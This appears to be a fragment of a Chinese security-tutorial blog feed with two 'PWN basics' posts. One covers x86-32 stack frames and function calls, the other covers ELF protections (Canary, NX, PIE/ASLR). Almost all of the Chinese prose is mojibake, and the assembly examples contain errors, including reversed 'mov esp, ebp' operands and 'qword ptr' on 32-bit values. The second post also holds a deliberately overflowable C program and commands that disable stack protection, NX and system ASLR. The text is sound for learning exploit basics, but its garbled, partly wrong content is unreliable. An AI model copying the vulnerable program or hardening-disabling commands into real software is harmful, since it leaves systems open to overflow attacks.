src="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/Pasted image 20250122134025.png" alt="Pasted image 20250122134025"><br>æˆ‘ä»¬å†æ¥çœ‹çœ‹popæ“ä½œçš„ä¾‹å­ï¼š</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">pop &#x2F;&#x2F; å°†0x50å¼¹å‡ºæ ˆ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/Pasted image 20250122134109.png" alt="Pasted image 20250122134109"></p><blockquote><p>ä¸Šé¢ä¾‹å­ä¸­æ ˆçš„ç”Ÿé•¿æ–¹å‘æ˜¯ä»é«˜åœ°å€åˆ°ä½åœ°å€çš„ï¼Œè¿™æ˜¯å› ä¸ºåœ¨ä¸‹æ–‡è®²çš„æ ˆå¸§ä¸­ï¼Œæ ˆå°±æ˜¯å‘ä¸‹ç”Ÿé•¿çš„ï¼Œå› æ­¤è¿™é‡Œä¹Ÿç”¨è¿™ç§å½¢å¼çš„æ ˆ<br>ç¬¬äºŒï¼Œpopæ“ä½œåï¼Œæ ˆä¸­çš„æ•°æ®å¹¶æ²¡æœ‰è¢«æ¸…ç©ºï¼Œåªæ˜¯è¯¥æ•°æ®æˆ‘ä»¬æ— æ³•ç›´æ¥è®¿é—®ã€‚æœ‰äº†è¿™äº›æ ˆçš„åŸºæœ¬çŸ¥è¯†ï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥æ¥çœ‹çœ‹åœ¨x86-32bitç³»ç»Ÿä¸‹ï¼ŒCè¯­è¨€å‡½æ•°æ˜¯å¦‚ä½•è°ƒç”¨çš„äº†ã€‚</p><h2 id="æ ˆå¸§"><a href="#æ ˆå¸§" class="headerlink" title="æ ˆå¸§"></a>æ ˆå¸§</h2><p>æ ˆå¸§ï¼Œä¹Ÿå°±æ˜¯stack frameï¼Œ<strong>å…¶æœ¬è´¨å°±æ˜¯ä¸€ç§æ ˆï¼Œåªæ˜¯è¿™ç§æ ˆä¸“é—¨ç”¨äºä¿å­˜å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­çš„å„ç§ä¿¡æ¯ï¼ˆå‚æ•°ï¼Œè¿”å›åœ°å€ï¼Œæœ¬åœ°å˜é‡ç­‰ï¼‰ã€‚æ ˆå¸§æœ‰æ ˆé¡¶å’Œæ ˆåº•ä¹‹åˆ†ï¼Œå…¶ä¸­æ ˆé¡¶çš„åœ°å€æœ€ä½ï¼Œæ ˆåº•çš„åœ°å€æœ€é«˜ï¼ŒSP(æ ˆæŒ‡é’ˆ)å°±æ˜¯ä¸€ç›´æŒ‡å‘æ ˆé¡¶çš„</strong>ã€‚åœ¨x86-32bitä¸­ï¼Œ<em>æˆ‘ä»¬ç”¨ <code>ebp</code> æŒ‡å‘æ ˆåº•ï¼Œä¹Ÿå°±æ˜¯åŸºå€æŒ‡é’ˆï¼›ç”¨ <code>esp</code> æŒ‡å‘æ ˆé¡¶ï¼Œä¹Ÿå°±æ˜¯æ ˆæŒ‡é’ˆ</em>ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªæ ˆå¸§çš„ç¤ºæ„å›¾ï¼š<br><img src="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/Pasted image 20250122134229.png" alt="Pasted image 20250122134229"><br><strong>ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬å°† <code>ebp</code> åˆ° <code>esp</code> ä¹‹é—´åŒºåŸŸå½“åšæ ˆå¸§ï¼‰ã€‚<em>å¹¶ä¸æ˜¯æ•´ä¸ªæ ˆç©ºé—´åªæœ‰ä¸€ä¸ªæ ˆå¸§ï¼Œæ¯è°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„æ ˆå¸§</em>ã€‚åœ¨å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å°†è°ƒç”¨å‡½æ•°çš„å‡½æ•°ç§°ä¸ºâ€œè°ƒç”¨è€…(caller)â€ï¼Œå°†è¢«è°ƒç”¨çš„å‡½æ•°ç§°ä¸ºâ€œè¢«è°ƒç”¨è€…(callee)â€</strong>ã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œ</p><p>1ï¼‰â€œè°ƒç”¨è€…â€éœ€è¦çŸ¥é“åœ¨å“ªé‡Œè·å–â€œè¢«è°ƒç”¨è€…â€è¿”å›çš„å€¼ï¼›<br>2ï¼‰â€œè¢«è°ƒç”¨è€…â€éœ€è¦çŸ¥é“ä¼ å…¥çš„å‚æ•°åœ¨å“ªé‡Œï¼Œ<br>3ï¼‰è¿”å›çš„åœ°å€åœ¨å“ªé‡Œã€‚åŒæ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä¿è¯åœ¨â€œè¢«è°ƒç”¨è€…â€è¿”å›åï¼Œ<code>ebp</code>, <code>esp</code> ç­‰å¯„å­˜å™¨çš„å€¼åº”è¯¥å’Œè°ƒç”¨å‰ä¸€è‡´ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨æ ˆæ¥ä¿å­˜è¿™äº›æ•°æ®ã€‚</p><h2 id="å‡½æ•°è°ƒç”¨å®ä¾‹"><a href="#å‡½æ•°è°ƒç”¨å®ä¾‹" class="headerlink" title="å‡½æ•°è°ƒç”¨å®ä¾‹"></a>å‡½æ•°è°ƒç”¨å®ä¾‹</h2><h3 id="å‡½æ•°çš„è°ƒç”¨"><a href="#å‡½æ•°çš„è°ƒç”¨" class="headerlink" title="å‡½æ•°çš„è°ƒç”¨"></a>å‡½æ•°çš„è°ƒç”¨</h3><p>æˆ‘ä»¬ç›´æ¥é€šè¿‡å®ä¾‹æ¥çœ‹å‡½æ•°æ˜¯å¦‚ä½•è°ƒç”¨çš„ã€‚è¿™æ˜¯ä¸€ä¸ªæœ‰å‚æ•°ä½†æ²¡æœ‰è°ƒç”¨ä»»ä½•å‡½æ•°çš„ç®€å•å‡½æ•°ï¼Œæˆ‘ä»¬å‡è®¾å®ƒè¢«å…¶ä»–å‡½æ•°è°ƒç”¨ã€‚<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">int MyFunction(int x, int y, int z)&#123;    int a, b, c;    a &#x3D; 10;    b &#x3D; 5;    c &#x3D; 2;    ...&#125;int TestFunction()&#123;    int x &#x3D; 1, y &#x3D; 2, z &#x3D; 3;    MyFunction1(1, 2, 3);    ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>å¯¹äºè¿™ä¸ªå‡½æ•°ï¼Œå½“è°ƒç”¨æ—¶ï¼Œ<code>MyFunction()</code> çš„æ±‡ç¼–ä»£ç å¤§è‡´å¦‚ä¸‹ï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">_MyFunction:    push ebp            ; &#x2F;&#x2F;ä¿å­˜ebpçš„å€¼    mov  esp, ebp      ; &#x2F;&#x2F;å°†espçš„å€¼èµ‹ç»™ebpï¼Œä½¿æ–°çš„ebpæŒ‡å‘æ ˆé¡¶sub  esp, 0x12 ; &#x2F;&#x2F;åˆ†é…é¢å¤–ç©ºé—´ç»™æœ¬åœ°å˜é‡    mov  qword ptr [ebp-4], 10 ; &#x2F;&#x2F;å¯¹æ ˆä¸­å†…å­˜è¿›è¡Œèµ‹å€¼æ“ä½œï¼Œä¸‹åŒ    mov  qword ptr [ebp-8], 5 ;      mov  qword ptr [ebp-12], 2 ;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>å…‰çœ‹ä»£ç å¯èƒ½è¿˜æ˜¯ä¸å¤ªæ˜ç™½ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹æ­¤æ—¶çš„æ ˆæ˜¯ä»€ä¹ˆæ ·çš„ï¼š<br><img src="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/Pasted image 20250122134529.png" alt="Pasted image 20250122134529">æ­¤æ—¶è°ƒç”¨è€…åšäº†ä¸¤ä»¶äº‹æƒ…ï¼šç¬¬ä¸€ï¼Œå°†è¢«è°ƒç”¨å‡½æ•°çš„å‚æ•°æŒ‰ç…§ä»å³åˆ°å·¦çš„é¡ºåºå‹å…¥æ ˆä¸­ã€‚ç¬¬äºŒï¼Œå°†è¿”å›åœ°å€å‹å…¥æ ˆä¸­ã€‚è¿™ä¸¤ä»¶äº‹éƒ½æ˜¯è°ƒç”¨è€…è´Ÿè´£çš„ï¼Œå› æ­¤å‹å…¥çš„æ ˆåº”è¯¥å±äºè°ƒç”¨è€…çš„æ ˆå¸§ã€‚æˆ‘ä»¬å†æ¥çœ‹çœ‹<strong>è¢«è°ƒç”¨è€…</strong>ï¼Œå®ƒä¹Ÿåšäº†ä¸¤ä»¶äº‹æƒ…ï¼šç¬¬ä¸€ï¼Œå°†è€çš„ï¼ˆè°ƒç”¨è€…çš„) <code>ebp</code> å‹å…¥æ ˆï¼Œæ­¤æ—¶ <code>esp</code> æŒ‡å‘å®ƒã€‚ç¬¬äºŒï¼Œå°† <code>esp</code> çš„å€¼èµ‹ç»™ <code>ebp</code>, <code>ebp</code> å°±æœ‰äº†æ–°çš„å€¼ï¼Œå®ƒä¹ŸæŒ‡å‘å­˜æ”¾è€ <code>ebp</code> çš„æ ˆç©ºé—´ã€‚è¿™æ—¶ï¼Œå®ƒæˆäº†æ˜¯å‡½æ•° <code>MyFunction()</code> æ ˆå¸§çš„æ ˆåº•ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬å°±ä¿å­˜äº†â€œè°ƒç”¨è€…â€å‡½æ•°çš„ <code>ebp</code>ï¼Œå¹¶ä¸”å»ºç«‹äº†ä¸€ä¸ªæ–°çš„æ ˆå¸§ã€‚</p></blockquote><p>åªè¦è¿™æ­¥å¼„æ˜ç™½äº†ï¼Œä¸‹é¢çš„æ“ä½œå°±å¥½ç†è§£äº†ã€‚åœ¨ <code>ebp</code> æ›´æ–°åï¼Œæˆ‘ä»¬å…ˆåˆ†é…ä¸€å—0x12å­—èŠ‚çš„ç©ºé—´ç”¨äºå­˜æ”¾æœ¬åœ°å˜é‡ï¼Œè¿™æ­¥ç”¨ <code>sub</code> æŒ‡ä»¤å®ç°ã€‚ã€‚é€šè¿‡ä½¿ç”¨ <code>movè½¬ç§»æŒ‡ä»¤</code> é…åˆ <code>å­—èŠ‚æ•° ptr [offset]</code> æˆ‘ä»¬ä¾¿å¯ä»¥ç»™ <code>a</code>, <code>b</code> å’Œ <code>c</code> èµ‹å€¼äº†ã€‚<br><img src="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/Pasted image 20250122134557.png" alt="Pasted image 20250122134557"></p><h3 id="å‡½æ•°çš„è¿”å›"><a href="#å‡½æ•°çš„è¿”å›" class="headerlink" title="å‡½æ•°çš„è¿”å›"></a>å‡½æ•°çš„è¿”å›</h3><p>ä¸Šé¢è®²çš„éƒ½æ˜¯å‡½æ•°çš„è°ƒç”¨è¿‡ç¨‹ï¼Œæˆ‘ä»¬ç°åœ¨æ¥çœ‹çœ‹å‡½æ•°æ˜¯å¦‚ä½•è¿”å›çš„ã€‚ä»ä¸‹é¢è¿™ä¸ªä¾‹å­æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œå’Œè°ƒç”¨å‡½æ•°æ—¶æ­£å¥½ç›¸åã€‚å½“å‡½æ•°å®Œæˆè‡ªå·±çš„ä»»åŠ¡åï¼Œå®ƒä¼šå°† <code>esp</code> ç§»åˆ° <code>ebp</code> å¤„ï¼Œç„¶åå†å¼¹å‡ºæ—§çš„ <code>ebp</code> çš„å€¼åˆ° <code>ebp</code>ã€‚è¿™æ ·ï¼Œ<code>ebp</code> å°±æ¢å¤åˆ°äº†å‡½æ•°è°ƒç”¨å‰çš„çŠ¶æ€äº†ã€‚<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">int MyFunction( int x, int y, int z )&#123;    int a, int b, int c;    ...    return;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>å…¶æ±‡ç¼–å¤§è‡´å¦‚ä¸‹ï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">_MyFunction:    push ebp    mov esp, ebp    ...    mov ebp, esp    pop ebp    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>æˆ‘ä»¬æ³¨æ„åˆ°æœ€åæœ‰ä¸€ä¸ª <code>ret</code> æŒ‡ä»¤ï¼Œè¿™ä¸ªæŒ‡ä»¤ç›¸å½“äº <code>pop + jum</code>ã€‚å®ƒé¦–å…ˆå°†æ•°æ®ï¼ˆè¿”å›åœ°å€ï¼‰å¼¹å‡ºæ ˆå¹¶ä¿å­˜åˆ° <code>eip</code> ä¸­ï¼Œç„¶åå¤„ç†å™¨æ ¹æ®è¿™ä¸ªåœ°å€æ— æ¡ä»¶åœ°è·³åˆ°ç›¸åº”ä½ç½®è·å–æ–°çš„æŒ‡ä»¤ã€‚<br><img src="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/Pasted image 20250122134852.png" alt="Pasted image 20250122134852"></p><h2 id="å®è§‚ä¸€ä¾‹"><a href="#å®è§‚ä¸€ä¾‹" class="headerlink" title="å®è§‚ä¸€ä¾‹"></a>å®è§‚ä¸€ä¾‹</h2><p><img src="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/Pasted image 20250207201642.png" alt="Pasted image 20250207201642"><br><img src="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/Pasted image 20250207201650.png" alt="Pasted image 20250207201650"><br><img src="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/Pasted image 20250207185644.png" alt="Pasted image 20250207185644"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELFæ–‡ä»¶ä¿æŠ¤æœºåˆ¶</title>
      <link href="/2025/02/06/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
      <url>/2025/02/06/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p>Linux ELFæ–‡ä»¶çš„ä¿æŠ¤ä¸»è¦æœ‰å››ç§ï¼šCanaryã€NXã€PIEã€RELRO</p><h2 id="1-Canary"><a href="#1-Canary" class="headerlink" title="1.Canary"></a>1.Canary</h2><p><strong>StackCanaryè¡¨ç¤ºæ ˆçš„æŠ¥è­¦ä¿æŠ¤</strong>ã€‚<br>åœ¨å‡½æ•°è¿”å›å€¼ä¹‹å‰æ·»åŠ çš„ä¸€ä¸²éšæœºæ•°ï¼ˆä¸è¶…è¿‡æœºå™¨å­—é•¿ï¼‰ï¼ˆä¹Ÿå«åšcookieï¼‰ï¼Œæœ«ä½ä¸º/x00ï¼ˆæä¾›äº†è¦†ç›–æœ€åä¸€å­—èŠ‚è¾“å‡ºæ³„éœ²Canaryçš„å¯èƒ½ï¼‰ï¼Œå¦‚æœå‡ºç°ç¼“å†²åŒºæº¢å‡ºæ”»<br>å‡»ï¼Œè¦†ç›–å†…å®¹è¦†ç›–åˆ°Canaryå¤„ï¼Œå°±ä¼šæ”¹å˜åŸæœ¬è¯¥å¤„çš„æ•°å€¼ï¼Œ<em>å½“ç¨‹åºæ‰§è¡Œåˆ°æ­¤å¤„æ—¶ï¼Œä¼šæ£€æŸ¥Canaryå€¼æ˜¯å¦è·Ÿå¼€å§‹çš„å€¼ä¸€æ ·ï¼Œå¦‚æœä¸ä¸€æ ·ï¼Œç¨‹åºä¼šå´©æºƒï¼Œä»è€Œè¾¾åˆ°ä¿æŠ¤è¿”å›åœ°å€çš„ç›®çš„ã€‚</em><br><img src="/2025/02/06/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/Pasted image 20250214194346.png" alt="Pasted image 20250214194346"></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;GCCç”¨æ³•gcc -o test test.c &#x2F;&#x2F; é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸å¼€å¯Canaryä¿æŠ¤gcc -fno-stack-protector -o test test.c &#x2F;&#x2F;ç¦ç”¨æ ˆä¿æŠ¤gcc -fstack-protector -o test test.c &#x2F;&#x2F;å¯ç”¨å †æ ˆä¿æŠ¤ï¼Œä¸è¿‡åªä¸ºå±€éƒ¨å˜é‡ä¸­å«æœ‰ char æ•°ç»„çš„å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç gcc -fstack-protector-all -o test test.c &#x2F;&#x2F;å¯ç”¨å †æ ˆä¿æŠ¤ï¼Œä¸ºæ‰€æœ‰å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç -fno-stack-protector &#x2F;-fstack-protector &#x2F; -fstack-protector-all (å…³é—­ &#x2F; å¼€å¯ &#x2F; å…¨å¼€å¯)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-DEP-DataExecutionPrevention-NX-Non-executable-é˜²æŠ¤"><a href="#2-DEP-DataExecutionPrevention-NX-Non-executable-é˜²æŠ¤" class="headerlink" title="2.DEP(DataExecutionPrevention)/NX(Non-executable)é˜²æŠ¤"></a>2.DEP(DataExecutionPrevention)/NX(Non-executable)é˜²æŠ¤</h2><p>NXå³No-eXecuteï¼ˆä¸å¯æ‰§è¡Œï¼‰çš„æ„æ€ï¼ŒNX(DEPï¼‰çš„åŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥shellcodeæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚<br>æ­£å¸¸åœ¨æ ˆæº¢å‡ºæ—¶é€šè¿‡è·³è½¬æŒ‡ä»¤è·³è½¬è‡³shellcodeï¼Œä½†æ˜¯NXå¼€å¯åCPUä¼šå¯¹æ•°æ®åŒºåŸŸè¿›è¡Œæ£€æŸ¥ï¼Œå½“å‘ç°æ­£å¸¸ç¨‹åºä¸æ‰§è¡Œï¼Œå¹¶è·³è½¬è‡³å…¶ä»–åœ°å€åä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œæ¥ä¸‹æ¥ä¸ä¼šç»§ç»­æ‰§è¡Œshellcodeï¼Œè€Œæ˜¯å»è½¬å…¥å¼‚å¸¸å¤„ç†ï¼Œå¤„ç†åä¼šç¦æ­¢shellcodeç»§ç»­æ‰§è¡Œ</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">gcc -o test test.c &#x2F;&#x2F; é»˜è®¤æƒ…å†µä¸‹ï¼Œå¼€å¯NXä¿æŠ¤gcc -z execstack -o test test.c &#x2F;&#x2F; ç¦ç”¨NXä¿æŠ¤gcc -z noexecstack -o test test.c &#x2F;&#x2F; å¼€å¯NXä¿æŠ¤-z execstack &#x2F; -z noexecstack (å…³é—­ &#x2F; å¼€å¯)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ä¾‹"><a href="#ä¾‹" class="headerlink" title="ä¾‹"></a>ä¾‹</h3><p>è¯¥é˜²æŠ¤çš„ä½œç”¨ç®€å•çš„è¯´å°±æ˜¯èƒ½å†™çš„åœ°æ–¹ä¸èƒ½æ‰§è¡Œï¼Œèƒ½æ‰§è¡Œçš„åœ°æ–¹ä¸èƒ½å†™ã€‚<br>shellcode æ‰€å¡«å……çš„ä½ç½®æ˜¯åœ¨æ ˆä¸Šï¼Œä½†æ˜¯å¼€å¯äº† DEP ä¿æŠ¤åæ ˆä¸Šå°±æ²¡æœ‰æ‰§è¡Œçš„æƒé™ä¹Ÿå°±æ— æ³•æ§åˆ¶ç¨‹åºæµç¨‹ã€‚</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#undef _FORTIFY_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vulnerable_function() &#123;char buf[128];read(STDIN_FILENO, buf, 256);&#125;int main(int argc, char** argv) &#123;vulnerable_function();write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸å¼€å¯ DEP ä¿æŠ¤ç¼–è¯‘ï¼š<br><pre class="line-numbers language-none"><code class="language-none">gcc -fno-stack-protector -z execstack -o ret2lib ret2lib.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>æŸ¥çœ‹æƒé™å‘½ä»¤ï¼š<br><pre class="line-numbers language-none"><code class="language-none">cat &#x2F;proc&#x2F;[pid]&#x2F;maps<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>ç¨‹åºè¿è¡Œåœ¨åå°å‘½ä»¤ï¼š<br><pre class="line-numbers language-none"><code class="language-none">.&#x2F;ret2lib &amp;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>æƒé™å¦‚ä¸‹ï¼š<img src="/2025/02/06/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/Pasted image 20250125140328.png" alt="Pasted image 20250125140328">å¼€å¯ DEP ä¿æŠ¤ç¼–è¯‘ï¼š<br><pre class="line-numbers language-none"><code class="language-none">gcc -fno-stack-protector -o ret2lib ret2lib.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>æƒé™å¦‚ä¸‹ï¼š<br><img src="/2025/02/06/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/Pasted image 20250125140357.png" alt="Pasted image 20250125140357"><br>å¯ä»¥çœ‹åˆ°åœ¨å¼€å¯DEPé˜²æŠ¤çš„æƒ…å†µä¸‹æ ˆä¸Šé¢å°±æ²¡æœ‰æ‰§è¡Œæƒé™äº†ã€‚</p><h2 id="3-PIEï¼ˆASLRï¼‰"><a href="#3-PIEï¼ˆASLRï¼‰" class="headerlink" title="3.PIEï¼ˆASLRï¼‰"></a>3.PIEï¼ˆASLRï¼‰</h2><p>ä¸€èˆ¬æƒ…å†µä¸‹NXï¼ˆWindowså¹³å°ä¸Šç§°ä¸ºDEPï¼‰å’Œåœ°å€ç©ºé—´åˆ†å¸ƒéšæœºåŒ–ï¼ˆASLRï¼‰ä¼šåŒæ—¶å·¥ä½œã€‚å†…å­˜åœ°å€éšæœºåŒ–æœºåˆ¶æœ‰ä¸‰ç§æƒ…å†µ</p><blockquote><p>0 - è¡¨ç¤ºå…³é—­è¿›ç¨‹åœ°å€éšæœºåŒ–<br>1 - è¡¨ç¤ºå°†mmapçš„åŸºåœ°å€ï¼Œæ ˆåŸºåœ°å€å’Œ.soåœ°å€éšæœºåŒ–<br>2 - è¡¨ç¤ºåœ¨1çš„åŸºç¡€ä¸Šå¢åŠ heapçš„åœ°å€éšæœºåŒ–</p></blockquote><p><em>è¯¥ä¿æŠ¤èƒ½ä½¿æ¯æ¬¡è¿è¡Œçš„ç¨‹åºçš„åœ°å€éƒ½ä¸åŒï¼Œé˜²æ­¢æ ¹æ®å›ºå®šåœ°å€æ¥å†™expæ‰§è¡Œæ”»å‡»</em></p><blockquote><p>å¯ä»¥é˜²æ­¢Ret2libcæ–¹å¼é’ˆå¯¹DEPçš„æ”»å‡»ã€‚ASLRå’ŒDEPé…åˆä½¿ç”¨ï¼Œèƒ½æœ‰æ•ˆé˜»æ­¢æ”»å‡»è€…åœ¨å †æ ˆä¸Šè¿è¡Œæ¶æ„ä»£ç </p></blockquote><p>Linuxä¸‹å…³é—­PIEçš„å‘½ä»¤ï¼š<br><code>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</code><br><pre class="line-numbers language-C" data-language="C"><code class="language-C">gcc -o test test.c &#x2F;&#x2F; é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸å¼€å¯PIEgcc -fpie -pie -o test test.c &#x2F;&#x2F; å¼€å¯PIEï¼Œæ­¤æ—¶å¼ºåº¦ä¸º1gcc -fPIE -pie -o test test.c &#x2F;&#x2F; å¼€å¯PIEï¼Œæ­¤æ—¶ä¸ºæœ€é«˜å¼ºåº¦2gcc -fpic -o test test.c &#x2F;&#x2F; å¼€å¯PICï¼Œæ­¤æ—¶å¼ºåº¦ä¸º1ï¼Œä¸ä¼šå¼€å¯PIEgcc -fPIC -o test test.c &#x2F;&#x2F; å¼€å¯PICï¼Œæ­¤æ—¶ä¸ºæœ€é«˜å¼ºåº¦2ï¼Œä¸ä¼šå¼€å¯PIE-no-pie &#x2F; -pie (å…³é—­ &#x2F; å¼€å¯)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="èƒŒæ™¯çŸ¥è¯†"><a href="#èƒŒæ™¯çŸ¥è¯†" class="headerlink" title="èƒŒæ™¯çŸ¥è¯†"></a>èƒŒæ™¯çŸ¥è¯†</h3><p>ASLR(Address Space Layout Randomization)åœ¨2005å¹´è¢«å¼•å…¥åˆ°Linuxçš„å†…æ ¸ kernel 2.6.12 ä¸­ï¼Œå½“ç„¶æ—©åœ¨2004å¹´å°±ä»¥patchçš„å½¢å¼è¢«å¼•å…¥ã€‚<em>éšç€å†…å­˜åœ°å€çš„éšæœºåŒ–ï¼Œä½¿å¾—å“åº”çš„åº”ç”¨å˜å¾—éšæœºã€‚è¿™æ„å‘³ç€åŒä¸€åº”ç”¨å¤šæ¬¡æ‰§è¡Œæ‰€ä½¿ç”¨å†…å­˜ç©ºé—´å®Œå…¨ä¸åŒï¼Œä¹Ÿæ„å‘³ç€ç®€å•çš„ç¼“å†²åŒºæº¢å‡ºæ”»å‡»æ— æ³•è¾¾åˆ°ç›®çš„ã€‚</em><br>GDBä»ç‰ˆæœ¬7å¼€å§‹ï¼Œç¬¬ä¸€æ¬¡åœ¨Ubuntu 9.10ï¼ˆKarmicï¼‰ä¸Šï¼Œè¢«è°ƒè¯•çš„ç¨‹åºå¯ä»¥è¢«å…³é—­ASLRï¼ˆé€šè¿‡æ ‡è®°ä½ADDR_NO_RANDOMIZE ï¼‰ã€‚</p><blockquote><p>Ubuntu 9.10çš„ç‰ˆæœ¬æ§åˆ¶ASLRçš„æ–¹æ³•è¿˜ä¸æˆç†Ÿï¼Œéœ€è¦ä»æºç å±‚é¢ç¡®è®¤æ˜¯å¦å¯ä»¥å…³é—­å¼€å¯ã€‚</p><h3 id="æŸ¥çœ‹ASLRè®¾ç½®"><a href="#æŸ¥çœ‹ASLRè®¾ç½®" class="headerlink" title="æŸ¥çœ‹ASLRè®¾ç½®"></a>æŸ¥çœ‹ASLRè®¾ç½®</h3><p>æŸ¥çœ‹å½“å‰æ“ä½œç³»ç»Ÿçš„ASLRé…ç½®æƒ…å†µï¼Œä¸¤ç§å‘½ä»¤<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ cat &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space2$ sysctl -a --pattern randomizekernel.randomize_va_space &#x3D; 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="é…ç½®é€‰é¡¹"><a href="#é…ç½®é€‰é¡¹" class="headerlink" title="é…ç½®é€‰é¡¹"></a>é…ç½®é€‰é¡¹</h3><ul><li>0 = å…³é—­</li><li>1 = åŠéšæœºã€‚å…±äº«åº“ã€æ ˆã€mmap() ä»¥åŠ VDSO 